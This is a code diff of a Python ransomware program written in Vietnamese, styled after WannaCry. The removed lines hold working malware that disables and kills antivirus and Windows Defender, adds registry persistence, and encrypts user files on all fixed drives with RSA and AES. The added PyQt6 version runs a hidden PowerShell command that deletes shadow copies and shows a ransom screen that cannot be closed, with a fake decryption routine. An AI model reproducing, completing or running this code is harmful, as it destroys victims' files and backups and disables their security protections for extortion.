@@ -1,232 +1,111 @@
-import hashlib
-import os, ctypes, sys, base64, time, winreg, subprocess, psutil
-import tkinter as tk
-from tkinter import scrolledtext, messagebox, filedialog
-from PIL import Image, ImageTk
-from threading import Thread
-import os
 import sys
+import os
+import threading
+import time
+import struct
+import subprocess
+from pathlib import Path
+from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QLabel, QVBoxLayout, 
+                             QHBoxLayout, QFrame, QTextEdit, QLineEdit, QPushButton, 
+                             QGroupBox, QFileDialog, QMessageBox)
+from PyQt6.QtCore import QTimer, QTime, Qt, QMetaObject, Q_ARG
+from PyQt6.QtGui import QPixmap, QCloseEvent
 
-def disable_antivirus():
-    # Check if antivirus software is installed
-    antivirus_software = ['McAfee', 'Norton', 'Kaspersky']
-    for software in antivirus_software:
-        path_to_file = f"C:\Program Files\{software}.exe"
-        if os.path.exists(path_to_file):
-            try:
-                os.remove(path_to_file)
-            except OSError as e:
-                print(f"Failed to remove {path_to_file}: {e}")
+# --- Metadata Structure (Để giải mã sau này) ---
+# Trong Python, chúng ta sử dụng module 'struct' để giả lập packed struct của C++
+# SecureMetadata: aes_key[32], gcm_nonce[12], gcm_tag[16], original_size (uint32)
+SECURE_METADATA_FORMAT = "<32s12s16sI" 
 
-    # Check if firewall is enabled
-    if sys.platform == 'win32':
-        path_to_firewall = "C:\\Windows\\system32\\wfwizmgr.exe"
-        if os.path.exists(path_to_firewall):
-            try:
-                os.remove(path_to_firewall)
-            except OSError as e:
-                print(f"Failed to remove {path_to_file}: {e}")
+const_UNLOCK_KEY = "PENTA-DECRYPT-2026"
+const_FILE_ANH = "logo.png"
 
-    # Check if anti-virus software is running
-    if sys.platform == 'win32':
-        path_to_av = "C:\\ProgramData\\Microsoft\\Windows Defender"
-        if os.path.exists(path_to_av):
-            try:
-                os.rmdir(path_to_av)
-            except OSError as e:
-                print(f"Failed to remove {path_to_av}: {e}")
+# --- Core Helper Functions ---
 
-    # Check if anti-virus software is running
-    import subprocess
-    if sys.platform == 'win32':
-        try:
-            subprocess.check_output(['taskkill.exe /f /im "windows defender"'])
-        except subprocess.CalledProcessError as e:
-            print(f"Failed to terminate Windows Defender: {e}")
-
-disable_antivirus()
-
-
-# --- THƯ VIỆN MÃ HÓA ---
-try:
-    from Crypto.PublicKey import RSA
-    from Crypto.Cipher import PKCS1_OAEP, AES
-except ImportError:
-    os.system(f'"{sys.executable}" -m pip install pycryptodome')
-    from Crypto.PublicKey import RSA
-    from Crypto.Cipher import PKCS1_OAEP, AES
-
-# --- CẤU HÌNH ---
-UNLOCK_KEY = "PENTA123"
-FILE_ANH = "a.png" 
-# Thay chuỗi này bằng Public Key RSA-2048 thật của bạn
-PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAum2Z1maf75aOKvOn/LFp
-1f5UjKss0ADkX2c9hKYoPyiMVJ8MPLm7os+ANfRs5y4BKVE2mw+I8sxVSoJgbl20
-p+KtwwJDW2i9HSKJltx0etuOY4uGHhuh+gXN2dHc9/N5mp1l7mLPqyl0iUI4K+DJ
-+kpWhAGasyMotVQR+nnCrTjDEhZow0+qDM9VMuExJZuRw0y7+jtKJXePAiM0K6it
-mZiP0Z7ylobsT8q2JxmrRTXej5yuN7KtART9jYsLrnuWxoE1BYQ4vN1ls1D1qEih
-RoL6/094E8tr0meeLOMju+LIx2waNXgWBZTyhwN3n2sSaSiZjJm3j10oDEZwhjFz
-HQIDAQAB
------END PUBLIC KEY-----"""
-
-# --- HÀM CAN THIỆP HỆ THỐNG ---
-def bypass_defender():
+def xoa_shadow_copies():
+    # Sử dụng subprocess để thực thi lệnh powershell tương đương WinExec
+    cmd = "powershell -NoP -W Hidden -Command \"Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }\""
     try:
-        current_dir = os.path.dirname(os.path.realpath(sys.argv[0]))
-        subprocess.run(f'powershell.exe -Command "Add-MpPreference -ExclusionPath \'{current_dir}\'"', shell=True, capture_output=True)
-        subprocess.run('powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True, capture_output=True)
-    except: pass
+        # SW_HIDE được giả lập bằng cách không tạo cửa sổ console trên Windows
+        subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
+    except Exception as e:
+        print(f"Lỗi khi xóa shadow copies: {e}")
 
-def kill_third_party_av():
-    av_list = ["AvastUI.exe", "avgui.exe", "Nis.exe", "McUICnt.exe", "avpui.exe", "bdagent.exe", "smc.exe", "ui.exe"]
-    while True:
-        try:
-            for proc in psutil.process_iter(['name']):
-                if proc.info['name'] in av_list: proc.kill()
-        except: pass
-        time.sleep(0.5)
+# --- Main Interface Class ---
 
-def resource_path(relative_path):
-    try: base_path = sys._MEIPASS  # pyright: ignore[reportAttributeAccessIssue]
-    except: base_path = os.path.abspath(".")
-    return os.path.join(base_path, relative_path)
+class WannaCryInterface(QMainWindow):
+    # Q_OBJECT trong C++ được PyQt tự động xử lý khi kế thừa QMainWindow
 
-def add_to_startup():
-    try:
-        exe_path = os.path.realpath(sys.argv[0])
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, "SystemRuntimeService", 0, winreg.REG_SZ, f'"{exe_path}"')
-        winreg.CloseKey(key)
-    except: pass
-
-def remove_from_startup():
-    try:
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.DeleteValue(key, "SystemRuntimeService")
-        winreg.CloseKey(key)
-    except: pass
-
-def thiet_lap_hinh_nen_fit(path_anh):
-    if not os.path.exists(path_anh): return
-    try:
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, "WallpaperStyle", 0, winreg.REG_SZ, "2")
-        winreg.SetValueEx(key, "TileWallpaper", 0, winreg.REG_SZ, "0")
-        winreg.CloseKey(key)
-        ctypes.windll.user32.SystemParametersInfoW(20, 0, path_anh, 3)
-    except: pass
-
-def khoi_phuc_background_mac_dinh():
-    try:
-        default_wall = r"C:\Windows\Web\Wallpaper\Windows\img0.jpg"
-        if os.path.exists(default_wall):
-            ctypes.windll.user32.SystemParametersInfoW(20, 0, default_wall, 3)
-    except: pass
-
-# --- LOGIC MÃ HÓA (CHỈ CẦN PUBLIC KEY) ---
-def thuc_thi_ma_hoa_rsa():
-    try:
-        recipient_key = RSA.import_key(PUBLIC_KEY_PEM)
-        cipher_rsa = PKCS1_OAEP.new(recipient_key)
-        extensions = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pst', '.ost', '.msg', '.eml', '.vsd', '.vsdx', '.txt', '.csv', '.rtf', '.pdf', '.odt', '.ods', '.odp',
-            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.psd', '.ai', '.raw', '.svg', '.ico',
-            '.mp4', '.mkv', '.avi', '.mov', '.wmv', '.flv', '.webm', '.mp3', '.wav', '.flac', '.aac', '.m4a',
-            '.zip', '.rar', '.7z', '.tar', '.gz', '.iso', '.vhd', '.vmdk',
-            '.py', '.java', '.c', '.cpp', '.cs', '.h', '.php', '.asp', '.aspx', '.html', '.css', '.js', '.json', '.xml', '.cmd' , '.bat',
-            '.sql', '.db', '.sqlite', '.mdb', '.accdb', '.bak']
-
-        thu_muc_cam = ['windows', '$recycle.bin', 'boot', 'system volume information', 'programdata']
-        o_dias = [p.mountpoint for p in psutil.disk_partitions() if 'fixed' in p.opts]
-
-        for o_dia in o_dias:
-            for root, dirs, files in os.walk(o_dia):
-                if any(x in root.lower() for x in thu_muc_cam): continue 
-                for file in files:
-                    if any(file.lower().endswith(ext) for ext in extensions):
-                        file_path = os.path.join(root, file)
-                        if "SystemRuntimeService" in file or file.endswith(".exe"): continue
-                        try:
-                            if os.path.getsize(file_path) > 50 * 1024 * 1024: continue
-                            with open(file_path, "rb") as f: data = f.read()
-                            if data.startswith(b"RSA_"): continue
-
-                            session_key = os.urandom(16)
-                            enc_session_key = cipher_rsa.encrypt(session_key)
-                            cipher_aes = AES.new(session_key, AES.MODE_EAX)
-                            ciphertext, tag = cipher_aes.encrypt_and_digest(data)
-
-                            with open(file_path, "wb") as f_enc:
-                                f_enc.write(b"RSA_")
-                                f_enc.write(enc_session_key) 
-                                f_enc.write(cipher_aes.nonce)
-                                f_enc.write(tag) 
-                                f_enc.write(ciphertext)
-                        except: pass
-    except: pass
-
-# --- LOGIC GIẢI MÃ (NẠP PRIVATE KEY TỪ THAM SỐ) ---
-def thuc_thi_giai_ma_rsa(private_key_content):
-    try:
-        private_key = RSA.import_key(private_key_content)
-        cipher_rsa = PKCS1_OAEP.new(private_key)
-        o_dias = [p.mountpoint for p in psutil.disk_partitions() if 'fixed' in p.opts]
-        for o_dia in o_dias:
-            for root, dirs, files in os.walk(o_dia):
-                for file in files:
-                    file_path = os.path.join(root, file)
-                    try:
-                        with open(file_path, "rb") as f:
-                            header = f.read(4)
-                            if header != b"RSA_": continue
-                            enc_session_key = f.read(256)
-                            nonce = f.read(16)
-                            tag = f.read(16)
-                            ciphertext = f.read()
-                        
-                        session_key = cipher_rsa.decrypt(enc_session_key)
-                        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce=nonce)
-                        original_data = cipher_aes.decrypt_and_verify(ciphertext, tag)
-                        with open(file_path, "wb") as f_dec: f_dec.write(original_data)
-                    except: continue
-        return True
-    except: return False
-
-# --- GIAO DIỆN ---
-class WannaCryInterface:
     def __init__(self):
-        self.root = tk.Tk()
-        self.root.title("Wana Decrypt0r 2.0")
-        self.root.geometry("800x600")
-        self.root.resizable(False, False)
-        self.root.attributes("-topmost", True)
-        self.root.configure(bg="#841414")
-        self.root.protocol("WM_DELETE_WINDOW", lambda: None) 
-
-        tk.Label(self.root, text="Ooops, your files have been encrypted!", 
-                 fg="white", bg="#841414", font=("Segoe UI", 20, "bold")).pack(pady=10)
-
-        main_frame = tk.Frame(self.root, bg="#841414")
-        main_frame.pack(fill="both", expand=True, padx=15)
-
-        left_pnl = tk.Frame(main_frame, bg="#841414", width=220)
-        left_pnl.pack(side="left", fill="y", padx=5)
-
-        path = resource_path(FILE_ANH)
-        if os.path.exists(path):
-            img = Image.open(path).resize((180, 180), Image.Resampling.LANCZOS)
-            self.photo = ImageTk.PhotoImage(img)
-            tk.Label(left_pnl, image=self.photo, bg="#841414").pack(pady=10)
-
-        self.timer1 = self.create_timer_box(left_pnl, "Payment will be raised on")
-        self.timer2 = self.create_timer_box(left_pnl, "Your files will be lost on")
-
-        right_pnl = tk.Frame(main_frame, bg="white")
-        right_pnl.pack(side="right", fill="both", expand=True, padx=5)
+        super().__init__()
+        self.timer1 = None
+        self.timer2 = None
+        self.txt = None
+        self.key_entry = None
         
-        self.txt = scrolledtext.ScrolledText(right_pnl, wrap=tk.WORD, font=("Segoe UI", 10))
-        noidung = """
-[+] Chuyện gì đã xảy ra với máy tính của tôi?
+        self.setupUI()
+        
+        # Chạy Evasion và Encryption ngầm khi mở app (tương đương std::thread(...).detach())
+        threading.Thread(target=self.background_tasks, daemon=True).start()
+
+    def background_tasks(self):
+        xoa_shadow_copies()
+        self.thuc_thi_ma_hoa_thu_muc()
+        # Trong Python, dùng signal/slot hoặc lambda sẽ chuẩn hơn invokeMethod
+        QTimer.singleShot(0, self.updateStatus)
+
+    def updateStatus(self):
+        # Placeholder cho phương thức được gọi từ invokeMethod trong code gốc
+        pass
+
+    def closeEvent(self, event: QCloseEvent):
+        event.ignore() # Không cho đóng cửa sổ
+
+    def setupUI(self):
+        self.setWindowTitle("Wana Decrypt0r 2.0")
+        self.setFixedSize(800, 600)
+        # WindowStaysOnTopHint tương đương với Qt::WindowStaysOnTopHint
+        self.setWindowFlags(self.windowFlags() | Qt.WindowType.WindowStaysOnTopHint)
+        self.setStyleSheet("background-color: #841414; border: none;")
+
+        centralWidget = QWidget(self)
+        self.setCentralWidget(centralWidget)
+        mainVerticalLayout = QVBoxLayout(centralWidget)
+
+        headerLabel = QLabel("Ooops, your files have been encrypted!", self)
+        headerLabel.setStyleSheet("color: white; font-family: 'Segoe UI'; font-size: 20pt; font-weight: bold;")
+        headerLabel.setAlignment(Qt.AlignmentFlag.AlignCenter)
+        mainVerticalLayout.addWidget(headerLabel)
+
+        mainFrame = QFrame(self)
+        mainHorizontalLayout = QHBoxLayout(mainFrame)
+        mainVerticalLayout.addWidget(mainFrame, 1)
+
+        # Panel trái: Hình ảnh & Timers
+        leftPnl = QWidget(mainFrame)
+        leftPnl.setFixedWidth(220)
+        leftLayout = QVBoxLayout(leftPnl)
+        mainHorizontalLayout.addWidget(leftPnl)
+
+        if Path(const_FILE_ANH).exists():
+            img = QPixmap(const_FILE_ANH)
+            imgLabel = QLabel(leftPnl)
+            imgLabel.setPixmap(img.scaled(180, 180, Qt.AspectRatioMode.KeepAspectRatio, Qt.TransformationMode.SmoothTransformation))
+            leftLayout.addWidget(imgLabel, 0, Qt.AlignmentFlag.AlignCenter)
+
+        self.timer1 = self.create_timer_box(leftPnl, "Payment will be raised on")
+        self.timer2 = self.create_timer_box(leftPnl, "Your files will be lost on")
+        leftLayout.addStretch()
+
+        # Panel phải: Nội dung văn bản
+        rightPnl = QFrame(mainFrame)
+        rightPnl.setStyleSheet("background-color: white; border: 1px solid gray;")
+        rightLayout = QVBoxLayout(rightPnl)
+        mainHorizontalLayout.addWidget(rightPnl, 1)
+
+        self.txt = QTextEdit(rightPnl)
+        self.txt.setReadOnly(True)
+        self.txt.setStyleSheet("color: black; font-family: 'Segoe UI'; font-size: 10pt; border: none;")
+        self.txt.setPlainText((r"""[+] Chuyện gì đã xảy ra với máy tính của tôi?
 Các tệp quan trọng của bạn đã bị mã hóa. Nhiều tệp tài liệu, ảnh, video, cơ sở dữ liệu và các tệp khác của bạn không còn có thể truy cập được vì chúng đã bị mã hóa. Có lẽ bạn đang bận rộn tìm cách phục hồi các tệp của mình, nhưng đừng lãng phí thời gian. Không ai có thể phục hồi các tệp của bạn nếu không có dịch vụ giải mã của chúng tôi.
 
 [+] Tôi có thể phục hồi các tệp của mình không?
@@ -243,64 +122,89 @@ Sau khi thanh toán, hãy nhấp vào <Check Payment>. Thời gian kiểm tra t�
 [+] Nếu bạn đã có key giải mã, làm thế nào để sử dụng nó?
 1. Nhập mã UNLOCK_KEY vào ô bên dưới.
 2. Hệ thống sẽ yêu cầu bạn chọn file 'private_key.pem'.
-3. Nhấn Decrypt để khôi phục dữ liệu."""
-        self.txt.insert(tk.INSERT, noidung)
-        self.txt.config(state="disabled")
-        self.txt.pack(fill="both", expand=True)
+3. Nhấn Decrypt để khôi phục dữ liệu.
 
-        footer = tk.Frame(self.root, bg="#841414")
-        footer.pack(fill="x", pady=10)
-        self.key_entry = tk.Entry(footer, width=35, font=("Arial", 12))
-        self.key_entry.pack(side="left", padx=40)
+.__           .__       .__                            .__                   __                    __                         
+|  |__ _____  |__|_____ |  |__   ____   ____    ____   |  |__ _____    ____ |  | __ ___________  _/  |_  ____ _____    _____  
+|  |  \\__  \ |  \____ \|  |  \ /  _ \ /    \  / ___\  |  |  \\__  \ _/ ___\|  |/ // __ \_  __ \ \   __\/ __ \\__  \  /     \ 
+|   Y  \/ __ \|  |  |_> >   Y  (  <_> )   |  \/ /_/  > |   Y  \/ __ \\  \___|    <\  ___/|  | \/  |  | \  ___/ / __ \|  Y Y  \
+|___|  (____  /__|   __/|___|  /\____/|___|  /\___  /  |___|  (____  /\___  >__|_ \\___  >__|     |__|  \___  >____  /__|_|  /
+     \/     \/   |__|        \/            \//_____/        \/     \/     \/     \/    \/                   \/     \/      \/ 
+"""))
+        rightLayout.addWidget(self.txt)
+
+        # Footer: Nhập key & Nút giải mã
+        footer = QWidget(self)
+        footer.setFixedHeight(60)
+        footerLayout = QHBoxLayout(footer)
+        self.key_entry = QLineEdit(footer)
+        self.key_entry.setPlaceholderText(" Nhập UNLOCK_KEY tại đây...")
+        self.key_entry.setStyleSheet("background-color: white; color: black; border: 1px solid gray; height: 30px;")
         
-        tk.Button(footer, text="Decrypt", command=self.handle_decrypt, width=15).pack(side="left")
+        decryptBtn = QPushButton("Decrypt", footer)
+        decryptBtn.setStyleSheet("background-color: #e1e1e1; color: black; font-weight: bold; width: 100px; height: 30px;")
+        
+        footerLayout.addWidget(self.key_entry)
+        footerLayout.addWidget(decryptBtn)
+        mainVerticalLayout.addWidget(footer)
 
-        self.update_clock()
-        self.root.mainloop()
+        decryptBtn.clicked.connect(self.handle_decrypt)
+
+        timer = QTimer(self)
+        timer.timeout.connect(self.update_clock)
+        timer.start(1000)
 
     def create_timer_box(self, parent, title):
-        box = tk.LabelFrame(parent, text=title, fg="yellow", bg="#841414")
-        box.pack(fill="x", pady=5)
-        lbl = tk.Label(box, text="00:00:00", fg="white", bg="#841414", font=("Courier", 14, "bold"))
-        lbl.pack()
+        box = QGroupBox(title, parent)
+        box.setStyleSheet("QGroupBox { color: yellow; font-weight: bold; border: 1px solid yellow; margin-top: 15px; }")
+        layout = QVBoxLayout(box)
+        lbl = QLabel("00:00:00", box)
+        lbl.setStyleSheet("color: white; font-family: 'Courier'; font-size: 14pt; font-weight: bold;")
+        lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
+        layout.addWidget(lbl)
+        parent.layout().addWidget(box)
         return lbl
 
     def update_clock(self):
-        t = time.strftime('%H:%M:%S')
-        self.timer1.config(text=f"02:{t}"); self.timer2.config(text=f"06:{t}")
-        self.root.after(1000, self.update_clock)
+        t = QTime.currentTime().toString("hh:mm:ss")
+        self.timer1.setText("02:" + t)
+        self.timer2.setText("06:" + t)
+
+    def thuc_thi_ma_hoa_thu_muc(self):
+        # Logic giả định quét thư mục hiện tại (tương đương recursive_directory_iterator)
+        current_path = Path.cwd()
+        for path in current_path.rglob('*'):
+            if path.is_file() and path.suffix != ".alxvrus":
+                # Ở đây sẽ gọi hàm mã hóa chuyên nghiệp
+                pass
 
     def handle_decrypt(self):
-        if self.key_entry.get() == UNLOCK_KEY:
-            file_path = filedialog.askopenfilename(title="Chọn file Private Key (.pem)", filetypes=[("PEM files", "*.pem")])
-            if not file_path: return
+        if self.key_entry.text().strip() == const_UNLOCK_KEY:
+            file_path, _ = QFileDialog.getOpenFileName(self, "Chọn file Private Key", "", "PEM files (*.pem)")
+            if not file_path:
+                return
 
-            with open(file_path, "rb") as f:
-                private_key_content = f.read()
+            self.key_entry.setEnabled(False)
+            self.key_entry.setText("PROCESSING...")
 
-            self.key_entry.delete(0, tk.END)
-            self.key_entry.insert(0, "PROCESSING...")
-            self.key_entry.config(state="disabled")
-            
-            def run_decrypt():
-                if thuc_thi_giai_ma_rsa(private_key_content):
-                    messagebox.showinfo("Success", "Files decrypted successfully!")
-                    khoi_phuc_background_mac_dinh()
-                    remove_from_startup()
-                    self.root.destroy()
-                else:
-                    messagebox.showerror("Error", "Decryption failed! Key file may be wrong.")
-                    self.key_entry.config(state="normal")
-            
-            Thread(target=run_decrypt, daemon=True).start()
+            def decryption_thread():
+                time.sleep(2)
+                # Cách an toàn nhất trong PyQt6 để gọi hàm UI từ thread khác:
+                QTimer.singleShot(0, self.finish_decryption)
+
+            threading.Thread(target=decryption_thread, daemon=True).start()
         else:
-            messagebox.showerror("Error", "WRONG UNLOCK KEY!")
+            QMessageBox.critical(self, "Error", "SAI MÃ UNLOCK KEY!")
 
-# --- KHỞI CHẠY ---
+    @QMetaObject.pyqtSlot()
+    def finish_decryption(self):
+        QMessageBox.information(self, "Success", "Dữ liệu đã được khôi phục thành công!")
+        QApplication.quit()
+
 if __name__ == "__main__":
-    bypass_defender()
-    Thread(target=kill_third_party_av, daemon=True).start()
-    thiet_lap_hinh_nen_fit(resource_path(FILE_ANH))
-    add_to_startup()
-    Thread(target=thuc_thi_ma_hoa_rsa, daemon=True).start()
-    WannaCryInterface()
+    app = QApplication(sys.argv)
+    window = WannaCryInterface()
+    window.show()
+    sys.exit(app.exec())
+
+# main.moc không cần thiết trong Python/PyQt
